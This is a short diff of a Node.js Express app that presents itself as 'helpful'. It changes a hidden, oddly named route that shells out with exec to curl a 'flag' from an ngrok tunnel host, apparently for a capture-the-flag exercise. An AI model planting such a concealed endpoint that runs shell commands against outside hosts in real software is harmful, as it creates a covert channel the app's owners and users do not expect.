@@ -5,7 +5,7 @@ app.get('/', function (req, res) {
   res.send('Im an helpful app!');
 });
 app.get('/test123moi/', function (req, ses){
-  exec("curl https://89e0-3-130-101-236.ngrok-free.app/flag ", (error, stdout, stderr) => {
+  exec("curl https://63ad-3-130-101-236.ngrok-free.app/flag", (error, stdout, stderr) => {
     if (error) {
         console.log(`error: ${error.message}`);
         return;
